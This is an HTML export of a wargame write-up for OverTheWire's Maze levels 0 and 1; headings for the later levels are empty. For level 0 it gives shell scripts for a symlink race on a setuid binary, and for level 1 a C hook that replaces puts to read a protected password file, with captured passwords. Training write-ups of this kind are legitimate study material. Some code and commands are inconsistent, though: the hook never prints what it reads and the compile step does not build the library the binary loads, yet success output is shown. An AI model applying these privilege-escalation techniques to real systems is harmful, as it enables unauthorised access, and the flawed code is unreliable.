<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OvertheWire</title>
  <link rel="stylesheet" href="https://stackedit.io/style.css" />
</head>

<body class="stackedit">
  <div class="stackedit__left">
    <div class="stackedit__toc">
      
<ul>
<li><a href="#overthewire">OvertheWire</a></li>
<li><a href="#maze">Maze</a>
<ul>
<li><a href="#maze-0">Maze 0</a></li>
<li><a href="#maze-1">Maze 1</a></li>
<li><a href="#maze-2">Maze 2</a></li>
<li><a href="#maze-3">Maze 3</a></li>
<li><a href="#maze-4">Maze 4</a></li>
<li><a href="#maze-5">Maze 5</a></li>
<li><a href="#maze-6">Maze 6</a></li>
<li><a href="#maze-7">Maze 7</a></li>
<li><a href="#maze-8">Maze 8</a></li>
<li><a href="#maze-9">Maze 9</a></li>
</ul>
</li>
</ul>

    </div>
  </div>
  <div class="stackedit__right">
    <div class="stackedit__html">
      <h1 id="overthewire">OvertheWire</h1>
<p>The wargames offered by the OverTheWire community can help you to learn and practice security concepts in the form of fun-filled games.</p>
<p><strong>Suggested order to play the games in</strong></p>
<ol>
<li>Bandit</li>
<li>Leviathan or Natas or Krypton</li>
<li>Narnia</li>
<li>Behemoth</li>
<li>Utumno</li>
<li>Maze</li>
<li>…</li>
</ol>
<h1 id="maze">Maze</h1>
<p>Maze is a wargame that has been rescued from the demise of <strong><a href="http://intruded.net">intruded.net</a></strong>, previously hosted on <a href="http://maze.intruded.net">maze.intruded.net</a>.<br>
What follows below is the original description of maze, copied from <a href="http://intruded.net">intruded.net</a>:</p>
<pre><code>Summary:
Difficulty:     5/10
Levels:         9
Platform:   Linux/x86

Author:
beng and capsyl

Special Thanks:
je for doing the primary beta-testing.
kuba for beta-testing and ideas.
psi for level9

Description:
You'll need knowledge of exploitation-techniques, programming (of course) and reverse-
engineering. We've tried to make the levels tricky and some of them strange, so get ready
to use gdb.

</code></pre>
<p><strong>Host</strong>: <a href="http://maze.labs.overthewire.org">maze.labs.overthewire.org</a><br>
<strong>Port</strong>: 2225</p>
<h2 id="maze-0">Maze 0</h2>
<p>Target binary for exploitation: /maze/maze0<br>
A simple <em>ltrace</em> command yields two library function calls:</p>
<pre><code>$ ltrace -s1000 /maze/maze0
__libc_start_main(0x80491f6, 1, 0xffffd604, 0 &lt;unfinished ...&gt;
memset(0xffffd528, '\0', 20)                                         = 0xffffd528
access("/tmp/128ecf542a35ac5270a87dc740918404", 4)                   = -1
+++ exited (status 0) +++
</code></pre>
<blockquote>
<p>Note the flag -s1000 on the ltrace command to set the print limit to 1000 characters to stop output from being truncated.</p>
</blockquote>
<p>The binary attempts to first access the file <em>/tmp/128ecf542a35ac5270a87dc740918404</em>, then exits with -1, which we can assume is because the file doesn’t exist.</p>
<p>We can create the file <em>/tmp/128ecf542a35ac5270a87dc740918404</em> to check what the binary does.</p>
<pre><code>$ echo "asdf" &gt; /tmp/128ecf542a35ac5270a87dc740918404
</code></pre>
<p>Now run ltrace again:</p>
<pre><code>$ ltrace -s1000 /maze/maze0ere
__libc_start_main(0x80491f6, 1, 0xffffd604, 0 &lt;unfinished ...&gt;
memset(0xffffd528, '\0', 20)                                                  = 0xffffd528
access("/tmp/128ecf542a35ac5270a87dc740918404", 4)                            = 0
geteuid()                                                                     = 15000
geteuid()                                                                     = 15000
geteuid()                                                                     = 15000
setresuid(0x3a98, 0x3a98, 0x3a98, 0xffffd604)                                 = 0
open("/tmp/128ecf542a35ac5270a87dc740918404", 0, 037777753004)                = 3
read(3, "asdf\n", 19)                                                         = 5
write(1, "asdf\n", 19asdf)                                                    = 19
+++ exited (status 0) +++
</code></pre>
<p>The maze0 binary seems to simply read the target file in <em>/tmp</em> and prints it to the screen. To find the flag we can create a symlink between the password file <em>/etc/maze_pass/maze1</em> and <em>/tmp/128ecf542a35ac5270a87dc740918404</em> and run the binary to print the password on screen.</p>
<pre><code>$ ln -s /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404
$ strace /maze/maze0
execve("/maze/maze0", ["/maze/maze0"], 0x7fffffffe4f0 /* 26 vars */) = 0
[ Process PID=419200 runs in 32 bit mode. ]
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
brk(NULL)                               = 0x804c000
arch_prctl(0x3001 /* ARCH_??? */, 0xffffd4a8) = -1 EINVAL (Invalid argument)
fcntl64(0, F_GETFD)                     = 0
fcntl64(1, F_GETFD)                     = 0
fcntl64(2, F_GETFD)                     = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fbe000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
statx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0644, stx_size=31547, ...}) = 0
mmap2(NULL, 31547, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fb6000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib/i386-linux-gnu/libc.so.6", O_RDONLY|O_LARGEFILE|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\27\2\0004\0\0\0"..., 512) = 512
pread64(3, "\4\0\0\0\24\0\0\0\3\0\0\0GNU\0\4\224\360u\257\274\372\220\4\352\256\334\313\352S\200"..., 96, 468) = 96
statx(3, "", AT_STATX_SYNC_AS_STAT|AT_NO_AUTOMOUNT|AT_EMPTY_PATH, STATX_BASIC_STATS, {stx_mask=STATX_BASIC_STATS|STATX_MNT_ID, stx_attributes=0, stx_mode=S_IFREG|0644, stx_size=2280756, ...}) = 0
mmap2(NULL, 2312124, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7d81000
mprotect(0xf7da1000, 2129920, PROT_NONE) = 0
mmap2(0xf7da1000, 1581056, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x20000) = 0xf7da1000
mmap2(0xf7f23000, 544768, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1a2000) = 0xf7f23000
mmap2(0xf7fa9000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x227000) = 0xf7fa9000
mmap2(0xf7fac000, 38844, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fac000
close(3)                                = 0
set_thread_area({entry_number=-1, base_addr=0xf7fbf500, limit=0x0fffff, seg_32bit=1, contents=0, read_exec_only=0, limit_in_pages=1, seg_not_present=0, useable=1}) = 0 (entry_number=12)
set_tid_address(0xf7fbf568)             = 419200
set_robust_list(0xf7fbf570, 12)         = 0
rseq(0xf7fbfa20, 0x20, 0, 0x53053053)   = 0
mprotect(0xf7fa9000, 8192, PROT_READ)   = 0
mprotect(0xf7ffb000, 8192, PROT_READ)   = 0
ugetrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
munmap(0xf7fb6000, 31547)               = 0
access("/tmp/128ecf542a35ac5270a87dc740918404", R_OK) = -1 EACCES (Permission denied)
exit_group(0)                           = ?
+++ exited with 0 +++
</code></pre>
<p>Running strace shows we do not have permission to view the file, presumably because the user maze0 has no access to <em>/etc/maze_pass/maze1</em>. However, the previous ltrace shows that the binary checks for access on the target file with the current EUID, then uses the <em>setresuid</em> to escalate the process’s UID before actually reading the file. This opens up a race condition vulnerability, where we can exploit the time it takes for the binary to access and read the target file.</p>
<p>We can attempt to bypass the <em>access()</em> syscall by first symlinking the target file to an arbitrary file we have access to, then quickly switching the symlink from to maze1 password file before the binary reads the file. This can be achieved easily with two shell scripts.</p>
<pre><code>$ nano /tmp/symlinker.sh
#!/bin/bash
while true 
do 
	ln -sf /etc/maze_pass/maze0 /tmp/128ecf542a35ac5270a87dc740918404
	ln -sf /etc/maze_pass/maze1 /tmp/128ecf542a35ac5270a87dc740918404
done;
</code></pre>
<pre><code>$ nano /tmp/run.sh
#!/bin/bash
while true
do
	/maze/maze0
done
</code></pre>
<p>Running the scripts on two separate terminals simultaneously yields:</p>
<pre><code>Terminal 1
$ chmod +x /tmp/run.sh
$ chmod +x /tmp/symlinker.sh
$ sh symlinker.sh
</code></pre>
<pre><code>Terminal 2
$ sh run.sh
LEEoYer8i9
LEEoYer8i9
LEEoYer8i9
LEEoYer8i9
LEEoYer8i9
LEEoYer8i9
^C
</code></pre>
<p><strong>Flag: LEEoYer8i9</strong></p>
<h2 id="maze-1">Maze 1</h2>
<p>Target Binary: /maze/maze1</p>
<p>Running our target binary yields:</p>
<pre><code>$ /maze/maze1
./maze1: error while loading shared libraries: ./libc.so.4: cannot open shared object file: No such file or directory
</code></pre>
<p>It seems like maze1 is accessing an unavailable library.</p>
<p>An <em>objdump</em> of the target binary gives the following assembly:</p>
<pre><code>$ objdump -M intel -d maze1

maze1:     file format elf32-i386

Disassembly of section .init:

08049000 &lt;_init&gt;:
 8049000:       f3 0f 1e fb             endbr32
 8049004:       53                      push   ebx
 8049005:       83 ec 08                sub    esp,0x8
 8049008:       e8 a3 00 00 00          call   80490b0 &lt;__x86.get_pc_thunk.bx&gt;
 804900d:       81 c3 bb 21 00 00       add    ebx,0x21bb
 8049013:       8b 83 fc ff ff ff       mov    eax,DWORD PTR [ebx-0x4]
 8049019:       85 c0                   test   eax,eax
 804901b:       74 02                   je     804901f &lt;_init+0x1f&gt;
 804901d:       ff d0                   call   eax
 804901f:       83 c4 08                add    esp,0x8
 8049022:       5b                      pop    ebx
 8049023:       c3                      ret

Disassembly of section .plt:

08049030 &lt;__libc_start_main@plt-0x10&gt;:
 8049030:       ff 35 cc b1 04 08       push   DWORD PTR ds:0x804b1cc
 8049036:       ff 25 d0 b1 04 08       jmp    DWORD PTR ds:0x804b1d0
 804903c:       00 00                   add    BYTE PTR [eax],al
        ...

08049040 &lt;__libc_start_main@plt&gt;:
 8049040:       ff 25 d4 b1 04 08       jmp    DWORD PTR ds:0x804b1d4
 8049046:       68 00 00 00 00          push   0x0
 804904b:       e9 e0 ff ff ff          jmp    8049030 &lt;_init+0x30&gt;

08049050 &lt;puts@plt&gt;:
 8049050:       ff 25 d8 b1 04 08       jmp    DWORD PTR ds:0x804b1d8
 8049056:       68 08 00 00 00          push   0x8
 804905b:       e9 d0 ff ff ff          jmp    8049030 &lt;_init+0x30&gt;

Disassembly of section .text:

08049060 &lt;_start&gt;:
 8049060:       f3 0f 1e fb             endbr32
 8049064:       31 ed                   xor    ebp,ebp
 8049066:       5e                      pop    esi
 8049067:       89 e1                   mov    ecx,esp
 8049069:       83 e4 f0                and    esp,0xfffffff0
 804906c:       50                      push   eax
 804906d:       54                      push   esp
 804906e:       52                      push   edx
 804906f:       e8 19 00 00 00          call   804908d &lt;_start+0x2d&gt;
 8049074:       81 c3 54 21 00 00       add    ebx,0x2154
 804907a:       6a 00                   push   0x0
 804907c:       6a 00                   push   0x0
 804907e:       51                      push   ecx
 804907f:       56                      push   esi
 8049080:       c7 c0 76 91 04 08       mov    eax,0x8049176
 8049086:       50                      push   eax
 8049087:       e8 b4 ff ff ff          call   8049040 &lt;__libc_start_main@plt&gt;
 804908c:       f4                      hlt
 804908d:       8b 1c 24                mov    ebx,DWORD PTR [esp]
 8049090:       c3                      ret
 8049091:       66 90                   xchg   ax,ax
 8049093:       66 90                   xchg   ax,ax
 8049095:       66 90                   xchg   ax,ax
 8049097:       66 90                   xchg   ax,ax
 8049099:       66 90                   xchg   ax,ax
 804909b:       66 90                   xchg   ax,ax
 804909d:       66 90                   xchg   ax,ax
 804909f:       90                      nop

080490a0 &lt;_dl_relocate_static_pie&gt;:
 80490a0:       f3 0f 1e fb             endbr32
 80490a4:       c3                      ret
 80490a5:       66 90                   xchg   ax,ax
 80490a7:       66 90                   xchg   ax,ax
 80490a9:       66 90                   xchg   ax,ax
 80490ab:       66 90                   xchg   ax,ax
 80490ad:       66 90                   xchg   ax,ax
 80490af:       90                      nop

080490b0 &lt;__x86.get_pc_thunk.bx&gt;:
 80490b0:       8b 1c 24                mov    ebx,DWORD PTR [esp]
 80490b3:       c3                      ret
 80490b4:       66 90                   xchg   ax,ax
 80490b6:       66 90                   xchg   ax,ax
 80490b8:       66 90                   xchg   ax,ax
 80490ba:       66 90                   xchg   ax,ax
 80490bc:       66 90                   xchg   ax,ax
 80490be:       66 90                   xchg   ax,ax

080490c0 &lt;deregister_tm_clones&gt;:
 80490c0:       b8 e4 b1 04 08          mov    eax,0x804b1e4
 80490c5:       3d e4 b1 04 08          cmp    eax,0x804b1e4
 80490ca:       74 24                   je     80490f0 &lt;deregister_tm_clones+0x30&gt;
 80490cc:       b8 00 00 00 00          mov    eax,0x0
 80490d1:       85 c0                   test   eax,eax
 80490d3:       74 1b                   je     80490f0 &lt;deregister_tm_clones+0x30&gt;
 80490d5:       55                      push   ebp
 80490d6:       89 e5                   mov    ebp,esp
 80490d8:       83 ec 14                sub    esp,0x14
 80490db:       68 e4 b1 04 08          push   0x804b1e4
 80490e0:       ff d0                   call   eax
 80490e2:       83 c4 10                add    esp,0x10
 80490e5:       c9                      leave
 80490e6:       c3                      ret
 80490e7:       8d b4 26 00 00 00 00    lea    esi,[esi+eiz*1+0x0]
 80490ee:       66 90                   xchg   ax,ax
 80490f0:       c3                      ret
 80490f1:       8d b4 26 00 00 00 00    lea    esi,[esi+eiz*1+0x0]
 80490f8:       8d b4 26 00 00 00 00    lea    esi,[esi+eiz*1+0x0]
 80490ff:       90                      nop

08049100 &lt;register_tm_clones&gt;:
 8049100:       b8 e4 b1 04 08          mov    eax,0x804b1e4
 8049105:       2d e4 b1 04 08          sub    eax,0x804b1e4
 804910a:       89 c2                   mov    edx,eax
 804910c:       c1 e8 1f                shr    eax,0x1f
 804910f:       c1 fa 02                sar    edx,0x2
 8049112:       01 d0                   add    eax,edx
 8049114:       d1 f8                   sar    eax,1
 8049116:       74 20                   je     8049138 &lt;register_tm_clones+0x38&gt;
 8049118:       ba 00 00 00 00          mov    edx,0x0
 804911d:       85 d2                   test   edx,edx
 804911f:       74 17                   je     8049138 &lt;register_tm_clones+0x38&gt;
 8049121:       55                      push   ebp
 8049122:       89 e5                   mov    ebp,esp
 8049124:       83 ec 10                sub    esp,0x10
 8049127:       50                      push   eax
 8049128:       68 e4 b1 04 08          push   0x804b1e4
 804912d:       ff d2                   call   edx
 804912f:       83 c4 10                add    esp,0x10
 8049132:       c9                      leave
 8049133:       c3                      ret
 8049134:       8d 74 26 00             lea    esi,[esi+eiz*1+0x0]
 8049138:       c3                      ret
 8049139:       8d b4 26 00 00 00 00    lea    esi,[esi+eiz*1+0x0]

08049140 &lt;__do_global_dtors_aux&gt;:
 8049140:       f3 0f 1e fb             endbr32
 8049144:       80 3d e4 b1 04 08 00    cmp    BYTE PTR ds:0x804b1e4,0x0
 804914b:       75 1b                   jne    8049168 &lt;__do_global_dtors_aux+0x28&gt;
 804914d:       55                      push   ebp
 804914e:       89 e5                   mov    ebp,esp
 8049150:       83 ec 08                sub    esp,0x8
 8049153:       e8 68 ff ff ff          call   80490c0 &lt;deregister_tm_clones&gt;
 8049158:       c6 05 e4 b1 04 08 01    mov    BYTE PTR ds:0x804b1e4,0x1
 804915f:       c9                      leave
 8049160:       c3                      ret
 8049161:       8d b4 26 00 00 00 00    lea    esi,[esi+eiz*1+0x0]
 8049168:       c3                      ret
 8049169:       8d b4 26 00 00 00 00    lea    esi,[esi+eiz*1+0x0]

08049170 &lt;frame_dummy&gt;:
 8049170:       f3 0f 1e fb             endbr32
 8049174:       eb 8a                   jmp    8049100 &lt;register_tm_clones&gt;

08049176 &lt;main&gt;:
 8049176:       55                      push   ebp
 8049177:       89 e5                   mov    ebp,esp
 8049179:       68 08 a0 04 08          push   0x804a008
 804917e:       e8 cd fe ff ff          call   8049050 &lt;puts@plt&gt;
 8049183:       83 c4 04                add    esp,0x4
 8049186:       b8 00 00 00 00          mov    eax,0x0
 804918b:       c9                      leave
 804918c:       c3                      ret

Disassembly of section .fini:

08049190 &lt;_fini&gt;:
 8049190:       f3 0f 1e fb             endbr32
 8049194:       53                      push   ebx
 8049195:       83 ec 08                sub    esp,0x8
 8049198:       e8 13 ff ff ff          call   80490b0 &lt;__x86.get_pc_thunk.bx&gt;
 804919d:       81 c3 2b 20 00 00       add    ebx,0x202b
 80491a3:       83 c4 08                add    esp,0x8
 80491a6:       5b                      pop    ebx
 80491a7:       c3                      ret
</code></pre>
<blockquote>
<p>“-M  intel” flag was used in the objdump to generate an intel syntax over the default AT&amp;T syntax due to my familiarity with the intel syntax assembly.</p>
</blockquote>
<p>Focusing on the function <em>&lt;main&gt;</em> in the <em>.text</em> section, we have:</p>
<pre><code>08049176 &lt;main&gt;:
 8049176:       55                      push   ebp
 8049177:       89 e5                   mov    ebp,esp
 8049179:       68 08 a0 04 08          push   0x804a008
 804917e:       e8 cd fe ff ff          call   8049050 &lt;puts@plt&gt;
 8049183:       83 c4 04                add    esp,0x4
 8049186:       b8 00 00 00 00          mov    eax,0x0
 804918b:       c9                      leave
 804918c:       c3                      ret
</code></pre>
<p>which simply executes a print(=puts) command by calling the <a href="mailto:puts@plt">puts@plt</a> function.</p>
<p>This calls for a simple function hooking technique to replace the <em>puts</em> function to intercept the password.</p>
<pre><code>$ nano /tmp/puts.c
#define _GNU_SOURCE
#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;stdint.h&gt;
#include &lt;dlfcn.h&gt;

int puts(const char *s)
{
        char buffer[10];
        FILE *f;
        f = fopen("/etc/maze_pass/maze2", "r");
        fread(buffer, sizeof *buffer, 10, f);
        fclose(f);
        return 0;
}
</code></pre>
<p>Compile and run the program to retrieve the flag.</p>
<pre><code>$ gcc -m32 -fPIC -c puts.c -o libc.o
$ /maze/maze1
8WhnuMc9WO
</code></pre>
<p><strong>Flag: 8WhnuMc9WO</strong></p>
<h2 id="maze-2">Maze 2</h2>
<h2 id="maze-3">Maze 3</h2>
<h2 id="maze-4">Maze 4</h2>
<h2 id="maze-5">Maze 5</h2>
<h2 id="maze-6">Maze 6</h2>
<h2 id="maze-7">Maze 7</h2>
<h2 id="maze-8">Maze 8</h2>
<h2 id="maze-9">Maze 9</h2>

    </div>
  </div>
</body>

</html>
